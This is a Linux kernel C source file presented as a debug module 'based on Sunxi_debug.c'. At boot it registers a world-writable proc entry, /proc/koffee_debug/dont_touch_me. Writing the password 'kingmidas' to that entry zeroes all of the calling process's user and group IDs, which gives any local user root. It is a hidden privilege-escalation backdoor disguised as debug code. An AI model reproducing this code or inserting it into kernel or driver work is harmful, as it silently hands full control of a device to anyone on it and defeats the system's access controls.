/*
 * Based on Sunxi_debug.c
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 */
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/export.h>
#include <linux/kthread.h>

#include <linux/debugfs.h>
#include <linux/proc_fs.h>//add by fe3o4
#include <linux/uaccess.h>
#include <linux/cred.h>

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry * proc_su;


static int koffee_proc_su_write(struct file *file, const char __user *buffer,
 unsigned long count, void *data)
{
	char *buf;
	struct cred *cred;

	if (count < 1)
		return -EINVAL;

	buf = kmalloc(count, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	if (copy_from_user(buf, buffer, count)) {
		kfree(buf);
		return -EFAULT;
	}

	if(!strncmp("kingmidas",(char*)buf,12)){
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->euid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
	}

	kfree(buf);
	return count;
}


static int koffee_proc_su_read(char *page, char **start, off_t off,
 int count, int *eof, void *data)
{
 	return 0;
}

static int koffee_root_procfs_attach(void)
{
	proc_root = proc_mkdir("koffee_debug", NULL);
	proc_su= create_proc_entry("dont_touch_me", 0666, proc_root);
	if (IS_ERR(proc_su)){
		return -1;
	}
	proc_su->data = NULL;
	proc_su->read_proc = koffee_proc_su_read;
	proc_su->write_proc = koffee_proc_su_write;
	return 0;
	
}

static int koffee_debug_init(void)
{
	int ret;
	ret = koffee_root_procfs_attach();
	return ret;
}

subsys_initcall(koffee_debug_init);


